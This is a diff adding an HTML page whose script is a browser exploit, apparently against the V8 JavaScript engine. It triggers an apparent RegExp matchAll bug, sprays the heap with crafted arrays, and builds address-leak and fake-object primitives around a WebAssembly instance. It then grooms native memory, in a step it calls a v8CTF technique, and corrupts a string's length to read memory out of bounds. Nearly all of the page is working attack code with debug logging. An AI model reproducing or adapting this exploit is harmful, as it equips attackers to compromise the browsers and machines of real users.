@@ -1,0 +1,156 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P42</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
+const PINS=[0x1080011];
+const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
+const marker={mmm:1};
+const marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmI;
+const victim=[1.22,1.33,1.44];
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+// PRE-PROMOTE: force objB (and friends) to old gen so their FAs never move
+trash(230);trash(230);
+// re-touch objB after promotion to ensure elements stay hot
+objB[4]=wasmI; objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){
+  const pin=PINS[r%2];
+  const c1=w2f(pin,MAXS);
+  for(let i=0;i<12;i++){
+    const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
+    for(let j=1;j<a.length;j+=2)a[j]=c1;
+    sk.push(a);
+  }
+}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  const d=[];
+  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
+  log("H0: "+d.join(","));
+  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
+  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
+  // collect ALL marker candidates
+  const cands=[];
+  for(let k=0x8000;k<0x70000;k++){
+    try{
+      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
+        if(f2i(m[k+1])===v){
+          const v3=f2i(m[k+2]);const w=v3&0xffffffffn;
+          if(w!==lo&&(w&1n)===1n&&w>0x1000n){cands.push(k);}
+        }
+      }
+    }catch(e){log("STOP:"+k.toString(16));break;}
+    if(cands.length>=6)break;
+  }
+  log("CANDS:"+cands.map(x=>x.toString(16)).join(","));
+  // live-test each candidate
+  const before=f2i(m[OB2(cands,0)]);
+  function OB2(arr,i){return arr[i]||0;}
+  let liveIdx=-1;
+  for(let ci=0;ci<cands.length;ci++){
+    const k=cands[ci];
+    const b4=f2i(m[k+2]);
+    objB[4]=marker2;
+    const a4=f2i(m[k+2]);
+    objB[4]=marker;
+    if(a4!==b4){liveIdx=ci;break;}
+  }
+  if(liveIdx<0){log("ALL_STALE");}
+  else{
+    const OB=cands[liveIdx];
+    log("LIVE@"+OB.toString(16));
+    // ADDROF
+    objB[4]=wasmI;
+    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
+    objB[4]=marker;
+    log("WASM:"+wasmAddr.toString(16));
+    // FAKEOBJ roundtrip
+    objB[4]=wasmI;
+    const raw=f2i(m[OB+2]);
+    m[OB+2]=i2f(raw);
+    const fo=objB[4];
+    log("FO:"+(!!fo&&!!fo.exports&&fo.exports.f()===42));
+    objB[4]=marker;
+    // ES + NATIVE GROOM (v8CTF technique: densify malloc heap with resource objects)
+    try{
+      const dec=new TextDecoder("windows-1252");
+      const holder=document.createElement("div");
+      const keep=[];
+      function externalize(size,byte){
+        const bytes=new Uint8Array(size);bytes.fill(byte);
+        const v=dec.decode(bytes);
+        holder.setAttribute("data-x"+keep.length,v);
+        keep.push(v);
+        return v;
+      }
+      // groom 3000 x 0x400 = ~4.8MB native resources with C++ vtables
+      for(let gi=0;gi<3000;gi++){externalize(0x400,0x42+(gi%24));}
+      const eb=new Uint8Array(0x40);eb.fill(0x41);
+      const es=dec.decode(eb);
+      // one more groom batch AFTER es so resources follow it in memory
+      for(let gi=0;gi<300;gi++){externalize(0x400,0x61+(gi%24));}
+      objB[4]=es;
+      const esAddr=f2i(m[OB+2])&0xffffffffn;
+      objB[4]=marker;
+      log("ES:"+esAddr.toString(16)+" DIFF:"+(esAddr!==wasmAddr));
+      // direct master write to es length qword at obj+8
+      const tq=(esAddr-1n)+8n;
+      const off=tq-0x1080018n;
+      if(off>0n&&off<0x400000n){
+        if((off&7n)===0n){
+          const idx=Number(off>>3n);
+          const v=f2i(m[idx]);
+          m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
+        }else{
+          const idx=Number((off-4n)>>3n);
+          const a=f2i(m[idx]);
+          const b=f2i(m[idx+1]);
+          m[idx]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
+          m[idx+1]=i2f(b);
+        }
+        log("NL:"+es.length.toString(16));
+        if(es.length===0x01200000){
+          const offs=[0x1000,0x2000,0x4000,0x8000,0x10000,0x20000,0x40000,0x80000];
+          const found=[];
+          for(const off of offs){
+            let s="";
+            for(let j2=0;j2<16;j2++){s+=es.charCodeAt(off+j2).toString(16).padStart(2,"0");}
+            if(s!=="00000000000000000000000000000000"){found.push(off.toString(16)+":"+s);}
+            if(found.length>=8)break;
+          }
+          log("SCAN:"+(found.length?found.join(","):"all_zero"));
+        }
+      }else{log("OFF_BAD:"+off.toString(16));}
+    }catch(e){log("ESE:"+e.message);}
+  }
+  log("W: "+wasmI.exports.f());
+}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
+else{log("OBJ:"+typeof m);}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
